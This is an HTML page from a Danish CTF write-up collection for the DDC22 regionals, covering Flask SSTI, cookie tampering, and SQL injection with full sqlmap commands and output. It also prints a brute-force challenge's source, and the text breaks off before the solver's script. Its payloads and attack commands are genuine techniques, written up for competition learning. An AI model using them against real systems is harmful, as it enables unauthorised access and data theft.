@@ -1,0 +1,1423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-04-15 Fri 15:51 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DDC22 Regionals | Write-up collection (Danish)</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="static/style.css" />
+<script>
+// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.add("code-highlighted");
+         target.classList.add("code-highlighted");
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.remove("code-highlighted");
+         target.classList.remove("code-highlighted");
+       }
+     }
+// @license-end
+</script>
+</head>
+<body>
+<div id="preamble" class="status">
+<div class="header">
+    <a href="index.html">Home</a>
+    <a href="https://github.com/c3lphie">Github</a>
+</div>
+</div>
+<div id="content" class="content">
+<header>
+<h1 class="title">DDC22 Regionals | Write-up collection (Danish)</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org6306ec9">1. Introduktion</a></li>
+<li><a href="#orgb70cd3c">2. Secret Squirrels Telekinetic Injector&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
+<li><a href="#org197d653">3. Baking Cookies&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
+<li><a href="#org2bed7b6">4. Searching Outside the Box&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
+<li><a href="#orgaefc136">5. Bare request amok&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
+<li><a href="#orgedc52b4">6. URL Parse&#xa0;&#xa0;&#xa0;<span class="tag"><span class="pwn">pwn</span></span></a></li>
+<li><a href="#org98d90e8">7. Mr Beefs Bestilling&#xa0;&#xa0;&#xa0;<span class="tag"><span class="boot2root">boot2root</span></span></a>
+<ul>
+<li><a href="#org60f9ef0">7.1. Unintended løsning</a></li>
+<li><a href="#orgde14a75">7.2. Serialize from scratch</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+<div id="outline-container-org6306ec9" class="outline-2">
+<h2 id="org6306ec9"><span class="section-number-2">1.</span> Introduktion</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Velkommen til denne write-up samling for de opgaver jeg klarede til den regionale del af De Danske Cybermesterskaber 2022.<br>
+Jeg skriver denne post på dansk, da jeg følte det var passende givet det er en dansk konkurrence.<br>
+Jeg klarede 6 opgaver i alt i den regionale del af konkurrencen, og fik med 800 point kvalificeret mig til finalen den 9. maj.<br>
+</p>
+</div>
+</div>
+<div id="outline-container-orgb70cd3c" class="outline-2">
+<h2 id="orgb70cd3c"><span class="section-number-2">2.</span> Secret Squirrels Telekinetic Injector&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-2">
+<p>
+Antal point: 50<br>
+Beskrivelse:<br>
+</p>
+<pre class="example" id="org9083268">
+De hemmelige egern er på farten igen med deres nødder og telekinetiske evner.
+Se om du kan finde deres hemmelige config key til deres hjemmeside ssti.hkn
+</pre>
+
+<p>
+I denne opgave bliver vi mødt af følgende velkomst side:<br>
+</p>
+<p>
+<img src="./assets/2022-04-14_13-33-37_screenshot.png" alt="2022-04-14_13-33-37_screenshot.png"><br>
+Hvor vi har mulighed for at opgive en email adresse for at abonnere på et nyhedsbrev omhandlende nogle nødder :^ )<br>
+</p>
+
+<p>
+Det som vi skriver bliver ikke valideret, men bliver direkte reflekteret tilbage i vores response:<br>
+<img src="./assets/2022-04-14_13-36-24_screenshot.png" alt="2022-04-14_13-36-24_screenshot.png"><br>
+</p>
+
+<p>
+Opgaven hinter til et specielt angreb kaldet Server Side Template Injection, der forkortet bliver til SSTI. Som næsten ikke er til at falde over på velkomst siden ;)<br>
+</p>
+
+<p>
+Hvis vi kigger på wappalyzer browser udvidelsen, kan vi se at siden køre <code>flask</code> i baggrunden:<br>
+<img src="assets/2022-04-14_13-48-03_screenshot.png" alt="2022-04-14_13-48-03_screenshot.png"><br>
+</p>
+
+<p>
+Flask bruger en template engine kaldet jinja, til at indsætte værdier i skabeloner for at kunne personliggøre indhold.<br>
+For eksempel vise en email adresse der er sendt afsted til et nyhedsbrev.<br>
+</p>
+
+<p>
+Vi kan teste om bruger inputtet bliver ordentligt saniteret inden at det bliver sat ind i skabelonen ved at sende følgende streng afsted:<br>
+</p>
+<pre class="example">
+{{7*7}}
+</pre>
+
+
+<p>
+Som vi kan se i responsen får vi altså resultatet tilbage!<br>
+<img src="assets/2022-04-14_13-54-05_screenshot.png" alt="2022-04-14_13-54-05_screenshot.png"><br>
+Siden er altså sårbar overfor SSTI!<br>
+Beskrivelsen nævner en hemmelig config key, og i flask er der et object kaldet <code>config</code> tilgængelig under behandling af requests.<br>
+Hvis vi istedet bruger payloaded <code>{{config}}</code> istedet for <code>{{7*7}}</code> så skulle vi gerne blive mødt af nogle hemmeligheder!<br>
+</p>
+
+<p>
+<img src="assets/2022-04-14_13-58-39_screenshot.png" alt="2022-04-14_13-58-39_screenshot.png"><br>
+Og der har vi jo flaget: <code>DDC{SSTI_1n_fl45k_15_wh3r3_7h3_squ1rr3l_h1d3_7h3_nutz}</code><br>
+</p>
+</div>
+</div>
+<div id="outline-container-org197d653" class="outline-2">
+<h2 id="org197d653"><span class="section-number-2">3.</span> Baking Cookies&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Antal point: 50<br>
+Beskrivelse:<br>
+</p>
+<pre class="example" id="orgb6520d2">
+Jeg har opdateret min hjemmeside til styring af kontakter og har nu fået lukket sikkerhedshullet i vCard-systemet. Jeg er dog stadig lidt bekymret, da jeg gemmer en del personfølsom data i mine systemer, og jeg vil nødig have, at nogen får adgang til andres konti og kontakter. Vil du tjekke den nye udgave for mig? Så giver jeg en cookie!
+
+http://contacts-vault.hkn
+</pre>
+
+<p>
+Besøger vi hjemmesiden linket i opgavens beskrivelse, bliver vi mødt af denne side:<br>
+<img src="assets/2022-04-14_14-02-44_screenshot.png" alt="2022-04-14_14-02-44_screenshot.png"><br>
+Her er der altså en masse lækker data lige til indsamle, hvis bare vi kan finde fejlen!<br>
+Efter at have oprettet en bruger og logget ind, bliver vi mødt af meget tom beholder for kontakter:<br>
+<img src="assets/2022-04-14_14-06-17_screenshot.png" alt="2022-04-14_14-06-17_screenshot.png"><br>
+</p>
+
+<p>
+Vi kan åbne hamburger menuen og søge efter kontakter, lave nye eller bare se alle kontakter.<br>
+Men beskrivelsen af opgaven hintede tile nogle cookies, så det var det første jeg tjekkede ud.<br>
+Man kan se de cookies ens browser gemmer under debug tools og storage:<br>
+<img src="assets/2022-04-14_14-09-02_screenshot.png" alt="2022-04-14_14-09-02_screenshot.png"><br>
+I cookien er der en JSON string hvor vi har et <code>_user_id</code> sat til værdien 6:<br>
+</p>
+<pre class="example" id="org9d7df33">
+"{\"_user_id\": \"6\"\054 \"_fresh\": true\054 \"_id\": \"a33260853250b0d0d323433e67e53e64f90ec67a81533f05ee8e64e816f281059ffad6ba117cef8c667a742331a27c09491075ab8a91c1aefb057e21c1cc6824\"}"
+</pre>
+
+<p>
+Hvis systemet bruger et incrementerende bruger ID, vil administrator brugeren med stor sandsynlighed have et ID på 1.<br>
+<img src="assets/2022-04-14_14-14-26_screenshot.png" alt="2022-04-14_14-14-26_screenshot.png"><br>
+Det virkede! Hvis vi scroller længere ned på siden finder vi flaget:<br>
+</p>
+<pre class="example">
+DDC{f1x_th4t_c00k1e_vuln_0r_cl0se_th3_b4k3ry}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org2bed7b6" class="outline-2">
+<h2 id="org2bed7b6"><span class="section-number-2">4.</span> Searching Outside the Box&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Antal point: 200<br>
+Beskrivelse:<br>
+</p>
+<pre class="example" id="org545edb6">
+Nu burde alle sikkerhedshullerne på min hjemmeside være lukket, så ingen længere kan se andres kontakter! Er lidt mere tryg nu, jeg har nemlig en super hemmelig kontakt, som ingen må få at se! Den er dog også ekstra beskyttet og kan kun ses direkte fra min admin profil.
+
+Jeg har også forbedret søgefunktionen lidt, så man nemmere kan finde sine kontakter. Vil du hjælpe mig med at tjekke nyeste udgave? Det er bare en formalitet, har næsten ikke ændret noget, men det skal jo gøres. Tak!
+
+http://contact-vault.hkn
+</pre>
+
+<p>
+Denne opgave er en fortsættelse på forrige opgave.<br>
+Efter at have patchet forrige fejl, skal vi prøve at finde en ny.<br>
+Brugerfladen er den samme som før, men kigger vi på vores cookies er den ikke længere så let læselig:<br>
+</p>
+<pre class="example" id="org8ee8153">
+.eJwljjsOAyEMBe9CncIfDGYvszJgK2nZbBXl7kFKM3oavWI-6Yzl1zMd73X7I52vmY5kzFRAhUmgw4TJxJnZS3XZzNHAR6mmKMwB4q7bumIJUgRpETZLN8Q6PHSU_a2ZmNGoDmi5IVSxrtZwoHl0kOq09xhFKacdcl--_jVI6fsDXpwuOQ.YlgREw.OJxo-Kot0pARQLuCN3HPX-aIqNU
+</pre>
+<p>
+En JWT token&#x2026; den kan vi ikke bare lige bryde&#x2026;<br>
+</p>
+
+<p>
+Til gengæld er der andre funktioner vi kan lege med!<br>
+Der er en søge funktion, som bliver hintet til i beskrivelsen.<br>
+Så jeg begyndte at lege med inputtet der til.<br>
+Søge funktionaliteten er med stor sandsynlighed baseret på SQL, og testede derfor for SQLinjection ved hjælp af følgende søgning:<br>
+</p>
+<pre class="example">
+' OR 1=1 -- -
+</pre>
+
+<p>
+Her hopper vi ud af strengen i SQL sætningen og siger sandt<br>
+Et gæt på hvordan sætningen på backenden vil se ud ville være:<br>
+</p>
+<pre class="example">
+SELECT * FROM 'contacts' WHERE '&lt;bruger input&gt;'
+</pre>
+
+
+<p>
+Med sqlinjection payload:<br>
+</p>
+<pre class="example">
+SELECT * FROM 'contacts' WHERE '' OR 1=1 -- -'
+</pre>
+
+<p>
+Hvor <code>-- -</code> er for at ud kommentere resten at sætningen.<br>
+OG DET VIRKER!!!! næsten&#x2026;<br>
+<img src="assets/2022-04-14_14-28-11_screenshot.png" alt="2022-04-14_14-28-11_screenshot.png"><br>
+Vi fik altså ikke <i>alle</i> kontakter ud&#x2026; for kigger man igennem listen er der desværre ikke noget flag.<br>
+Her fra ville man i det virkelige liv manuelt prøve at få et bedre overblik over database type, og teste forskellige SQL teknikker af&#x2026;.<br>
+Men det er her var en 10 timers ctf om en chance for at komme på det danske cyberlandshold. No way, har jeg tid eller forstand til at gøre det manuelt&#x2026;<br>
+</p>
+
+<p>
+Heldigvis er der en lille stykke software kaldet <code>sqlmap</code>.<br>
+</p>
+<!-- haha SQLmap go brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr -->
+<p>
+Men da vi er bag login, kan vi ikke bare sige:<br>
+</p>
+<pre class="example">
+sqlmap -u http://contact-vault.hkn/search?s=asd
+</pre>
+
+<p>
+Istedet kan vi bruge en fil der indeholder en HTTP request.<br>
+</p>
+<pre class="example" id="org478c596">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
+└─&gt; $ cat contact-vault.txt
+GET /search?s=asdf HTTP/1.1
+Host: contact-vault.hkn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Referer: http://contact-vault.hkn/search?s=%27+asdf
+Cookie: session=.eJwlzjEOwzAIAMC_eO4ABgPOZyIwtto1aaaqf2-kjrfdp-zrmOezbO_jmo-yv7JsxWs3X62jErhrBObIqERUHXRJr2BBtQ8mFhLq2MRCGluyeaqRTlVya-Qz6lRIAhy3hTkmhXikgcZYhqSDXUakQ-MIMchyR65zHv8NYvn-AJsCLvo.YlG_TQ.ya0WrIF0XfwLmbP8azYSGW9117A
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+
+</pre>
+<p>
+Denne er samlet op og gemt gennem burp suite.<br>
+Og så kan vi give den til sqlmap med flaget <code>-r</code> for request fil&#x2026;.<br>
+Men af en eller anden årsag virkede dette ikke for mig, grundet en bug i sqlmap skulle give den fulde path til filen, og det tog mig lidt for lang tid at indse til konkurrencen&#x2026; dette kunne dog fikses ved hjælp miljø variable <code>$PWD</code><br>
+</p>
+<pre class="example" id="orgfa77d10">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
+└─&gt; $ sqlmap -r $PWD/contact-vault.txt
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.6.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:29:51 /2022-04-14/
+
+[15:29:51] [INFO] parsing HTTP request from '/home/c3lphie/hacking/ctf/ddc22/regionals/contact-vault.txt'
+[15:29:51] [INFO] testing connection to the target URL
+[15:29:51] [INFO] testing if the target URL content is stable
+[15:29:52] [INFO] target URL content is stable
+[15:29:52] [INFO] testing if GET parameter 's' is dynamic
+[15:29:52] [INFO] GET parameter 's' appears to be dynamic
+[15:29:52] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable
+[15:29:52] [INFO] testing for SQL injection on GET parameter 's'
+[15:29:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:29:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[15:29:54] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[15:29:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[15:29:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[15:29:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[15:29:56] [INFO] testing 'Generic inline queries'
+[15:29:56] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
+[15:29:56] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[15:29:56] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[15:29:57] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
+[15:29:57] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
+[15:29:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[15:29:58] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]
+[15:30:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[15:30:01] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[15:30:01] [INFO] target URL appears to have 7 columns in query
+[15:30:01] [WARNING] applying generic concatenation (CONCAT)
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
+[15:30:11] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
+[15:30:15] [WARNING] GET parameter 's' does not seem to be injectable
+[15:30:15] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[15:30:15] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 103 times
+
+[*] ending @ 15:30:15 /2022-04-14/
+
+</pre>
+<p>
+Dette virkede heller ikke&#x2026; på trods af at vi havde bekræftet det selv&#x2026;<br>
+Grunden til dette er at sqlmap, kan hvis det ikke bliver brugt forsigtigt potentielt lave meget skade.<br>
+Vi kan sige at vi er ligeglade, og sætte vores level højere og lave et større mængde tests.<br>
+</p>
+<pre class="example" id="orgf496438">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
+└─&gt; $ sqlmap -r $PWD/contact-vault.txt --level=3 --threads=6
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:30:55 /2022-04-14/
+
+[15:30:55] [INFO] parsing HTTP request from '/home/c3lphie/hacking/ctf/ddc22/regionals/contact-vault.txt'
+[15:30:55] [INFO] testing connection to the target URL
+[15:30:56] [INFO] testing if the target URL content is stable
+[15:30:56] [INFO] target URL content is stable
+[15:30:56] [INFO] testing if GET parameter 's' is dynamic
+[15:30:56] [INFO] GET parameter 's' appears to be dynamic
+[15:30:56] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable
+[15:30:56] [INFO] testing for SQL injection on GET parameter 's'
+[15:30:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:30:57] [INFO] GET parameter 's' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="102")
+[15:30:57] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (1) values? [Y/n]
+[15:31:04] [INFO] testing 'Generic inline queries'
+[15:31:04] [INFO] testing 'SQLite inline queries'
+[15:31:04] [INFO] testing 'SQLite &gt; 2.0 stacked queries (heavy query - comment)'
+[15:31:04] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)
+[15:31:05] [INFO] testing 'SQLite &gt; 2.0 stacked queries (heavy query)'
+[15:31:05] [INFO] testing 'SQLite &gt; 2.0 AND time-based blind (heavy query)'
+[15:31:08] [INFO] GET parameter 's' appears to be 'SQLite &gt; 2.0 AND time-based blind (heavy query)' injectable
+[15:31:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[15:31:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[15:31:09] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[15:31:09] [INFO] target URL appears to have 7 columns in query
+
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
+[15:31:48] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
+[15:31:49] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[15:31:50] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[15:31:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[15:31:54] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[15:31:56] [INFO] checking if the injection point on GET parameter 's' is a false positive
+GET parameter 's' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 211 HTTP(s) requests:
+---
+Parameter: s (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: s=asdf' AND 8771=8771-- rhDS
+
+    Type: time-based blind
+    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)
+    Payload: s=asdf' AND 4111=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- tBKa
+---
+[15:31:59] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:31:59] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 139 times
+[15:31:59] [INFO] fetched data logged to text files under '/home/c3lphie/.local/share/sqlmap/output/contact-vault.hkn'
+
+[*] ending @ 15:31:59 /2022-04-14/
+
+</pre>
+<p>
+"I'm in! B)" - 1337 h4ck3r<br>
+Det virkede!<br>
+Nu skal vi bare finde flaget<br>
+Først kan vi finde tabellerne i data basen med:<br>
+</p>
+<pre class="example">
+sqlmap -r $PWD/contact-vault.txt  --tables
+</pre>
+
+
+<p>
+Hvilket gav os følgende tabeller:<br>
+</p>
+<ul class="org-ul">
+<li>contacts<br></li>
+<li>users<br></li>
+<li>reviews<br></li>
+</ul>
+
+<p>
+Her fra kan vi gå igennem de forskellige databaser med:<br>
+</p>
+<pre class="example">
+sqlmap -r $PWD/contact-vault.txt --dump &lt;tabel navn&gt;
+</pre>
+
+<p>
+Jeg valgte at gå efter kontakterne, og efter et par minutter fik jeg trukket følgende ud fra databasen:<br>
+</p>
+<pre class="example" id="orgb552db3">
++----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
+| id | user_id | 20 | 80 | 100 | 200 | email                                              | phone                  | FOREIGN | PRIMARY | is_secret | last_name  | first_name |
++----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
+| 1  | 1       | 20 | 80 | 100 | 200 | DDC{b3tt3r_f1x_th4t_SQLi_vuln_GDPR_4ud1t_1s_cl0s3} | 707.795.7976x4823      | NULL    | NULL    | 1         | McFlagFace | Flaggy     |
+| 2  | 2       | 20 | 80 | 100 | 200 | scottware@example.net                              | 387.321.1199x232       | NULL    | NULL    | 0         | Anderson   | Katelyn    |
+| 3  | 3       | 20 | 80 | 100 | 200 | dsmith@example.org                                 | 001-732-875-2279       | NULL    | NULL    | 0         | Summers    | Brendan    |
+| 4  | 5       | 20 | 80 | 100 | 200 | ybrooks@example.net                                | 001-578-221-0587x640   | NULL    | NULL    | 0         | Edwards    | Alexander  |
+| 5  | 10      | 20 | 80 | 100 | 200 | ecole@example.org                                  | (720)387-6625x98551    | NULL    | NULL    | 0         | Hammond    | Rebecca    |
+| 6  | 5       | 20 | 80 | 100 | 200 | leemelissa@example.org                             | 001-968-516-0783x1906  | NULL    | NULL    | 0         | Wright     | Nicholas   |
+| 7  | 8       | 20 | 80 | 100 | 200 | floresdarren@example.net                           | 001-056-694-9924x65994 | NULL    | NULL    | 0         | Mitchell   | Cheryl     |
+| 8  | 7       | 20 | 80 | 100 | 200 | johnsheppard@example.org                           | 001-175-115-0670x8237  | NULL    | NULL    | 0         | Gonzalez   | Benjamin   |
+| 9  | 3       | 20 | 80 | 100 | 200 | matthew03@example.net                              | 001-328-332-6948x0714  | NULL    | NULL    | 0         | Diaz       | Tonya      |
+| 10 | 6       | 20 | 80 | 100 | 200 | hwebster@example.net                               | 302-128-2921x2418      | NULL    | NULL    | 0         | Knapp      | Charles    |
+| 11 | 2       | 20 | 80 | 100 | 200 | kevinjohnson@example.com                           | 718.484.9614           | NULL    | NULL    | 0         | Chan       | Diana      |
+| 12 | 9       | 20 | 80 | 100 | 200 | gonzalezrachel@example.com                         | 001-127-324-1188       | NULL    | NULL    | 0         | Velasquez  | John       |
+| 13 | 7       | 20 | 80 | 100 | 200 | hamptondavid@example.net                           | 7260209982             | NULL    | NULL    | 0         | Price      | James      |
+| 14 | 7       | 20 | 80 | 100 | 200 | erin87@example.org                                 | 622-323-8993x556       | NULL    | NULL    | 0         | Davila     | Bobby      |
++----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
+</pre>
+<p>
+Og vi har også flaget:<br>
+</p>
+<pre class="example">
+DDC{b3tt3r_f1x_th4t_SQLi_vuln_GDPR_4ud1t_1s_cl0s3}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgaefc136" class="outline-2">
+<h2 id="orgaefc136"><span class="section-number-2">5.</span> Bare request amok&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-5">
+<p>
+Antal point: 100<br>
+Beskrivelse:<br>
+</p>
+<pre class="example" id="org5a7c35f">
+Du skal nok bare sende en masse requests altså bare-request-amok.hkn:5000
+</pre>
+
+<p>
+Til denne opgave skulle vi bruteforce et login til en hjemmeside, for derefter at navigere hen til et hemmeligt directory.<br>
+Besøger vi siden bliver vi mødt med følgende login:<br>
+</p>
+
+<figure id="org48f093b">
+<img src="assets/2022-04-14_09-57-27_screenshot.png" alt="2022-04-14_09-57-27_screenshot.png"><br>
+
+<figcaption><span class="figure-number">Figure 1: </span>Login side for opgaven.</figcaption>
+</figure>
+
+<p>
+De kære challenge authors, har været så venlige at give os kildekoden til web-appen&#x2026;(Tæller fedte-point til finalen? jk&#x2026;)<br>
+Grunden til det er fedt er at vi så har mulighed for at teste lokalt indtil det virker uden at belaste serveren!<br>
+Vi fik en filen <code>source.zip</code> udleveret med følgende indhold:<br>
+</p>
+<pre class="example" id="orgc0d96eb">
+total 1588
+-rw-r--r-- 1 c3lphie c3lphie    2985 Apr  9 17:56 app.py
+-rw-r--r-- 1 c3lphie c3lphie     961 Dec 13 11:29 directory.txt
+-rw-r--r-- 1 c3lphie c3lphie       7 Dec 13 12:32 flag.txt
+-rw-r--r-- 1 c3lphie c3lphie     966 Dec 13 11:28 passwords.txt
+drwxr-xr-x 5 c3lphie c3lphie    4096 Feb 20 17:27 static
+drwxr-xr-x 2 c3lphie c3lphie    4096 Dec 13 15:46 templates
+</pre>
+
+<p>
+De to filer, <code>passwords.txt</code> og <code>directory.txt</code> kan vi bruge som wordlister til vores bruteforce angreb!<br>
+Vi har også et test flag vi kan bruge mens vi test vores angreb!<br>
+</p>
+
+<p>
+Kigger vi gennem kildekoden i <code>app.py</code>, kan vi nemlig hurtigt se at det ikke bare lige er at smide værktøj som <code>hydra</code> eller <code>wfuzz</code> efter det.<br>
+Der er fire interessante funktioner:<br>
+</p>
+<ol class="org-ol">
+<li><code>index()</code><br></li>
+<li><code>wuhuuuuuuuuu()</code><br></li>
+<li><code>login()</code><br></li>
+<li><code>page_not_found(error)</code><br></li>
+</ol>
+
+<p>
+Hele applikationen bruger python biblioteket <code>flask</code> til at håndtere HTTP requests.<br>
+Og index funktionen, returnere altså enten <code>index.html</code> hvor vi kan logge ind, eller <code>admin.html</code> hvis vi er logget ind.<br>
+Der bliver også lavet en CSRF token, til at beskytte mod CSRF angreb.<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">@app.route("/")
+def index():
+    print(AdminPassword)
+    print(hiddendir)
+    if not session.get('logged_in'):
+	return render_template('index.html',csrf_token=newCSRF("index"))
+    else:
+	return render_template("admin.html",csrf_token=newCSRF("admin"))
+</pre>
+</div>
+
+<p>
+Nedenfor ses login funktionaliteten, hvor vi kan se at der SKAL bruges en CSRF token.<br>
+Heldigvis har vi et hardcoded brugernavn <code>admin</code>, hvilket skære en del af tid af vores angreb ikke at skulle fine brugernavn heller hehe.<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">@app.route("/login", methods=(['POST']))
+def login():
+    if request.method == 'POST':
+	username = request.form.get("username")
+	password = request.form.get("password")
+	csrf_token = request.form.get("csrf_token")
+	if username == "admin" and password == AdminPassword and useCSRF(csrf_token,"index"):
+	    print("dope")
+	    session.clear()
+	    session['logged_in'] = True
+	    session['username']="admin"
+    return redirect(url_for('index'))
+</pre>
+</div>
+<p>
+I denne funktion får vi flaget, men kun hvis vi er logget ind.<br>
+Der skal også bruges en CSRF token her for at kunne få flaget i sidste ende.<br>
+En lille detalje der er vigtig at bide mærke i er funktions kaldet inden vi returnere, <code>session.clear()</code> som gør at vi skal logge ind igen uanset hvad der sker med vores request.<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">@app.route("/"+hiddendir, methods=('GET','POST'))
+def wuhuuuuuuuuu():
+    print("hidden dir")
+    if request.method == 'POST' and session.get('logged_in'):
+	print("posted hidden dir")
+
+	csrf_token = request.form.get("csrf_token")
+	print("csrf "+csrf_token)
+	print(CSRFmap)
+	if useCSRF(csrf_token,"admin"):
+	    return """&lt;html&gt;
+				&lt;body&gt;
+				    &lt;h1&gt;%s&lt;/h1&gt;
+				&lt;/body&gt;
+				&lt;/html&gt;
+				""" % flag
+    session.clear()
+    return redirect(url_for('index'))
+</pre>
+</div>
+
+<p>
+En lille hale ved hele den her applikation er at vores session bliver cleared hver gang vi rammer HTTP status koden 404.<br>
+Vi skal altså logge ind igen, hvis vi rammer et ikke eksisterende endpoint.<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">@app.errorhandler(404)
+def page_not_found(error):
+    session.clear()
+    return redirect(url_for('index'))
+</pre>
+</div>
+
+<p>
+Så hvordan løser vi dette?<br>
+Jeg brugte python biblioteket <code>BeautifulSoup</code> til at trække vores CSRF token ud af vores response i <code>get_csrf</code> funktionen.<br>
+Og <code>requests</code> biblioteket til at håndtere HTTP requests der skulle sendes.<br>
+Jeg vil ikke gå i detaljer omkring mit script da det er relativ simpelt at forstå, men vil anbefale at læse det igennem hvis du ikke har erfaring.<br>
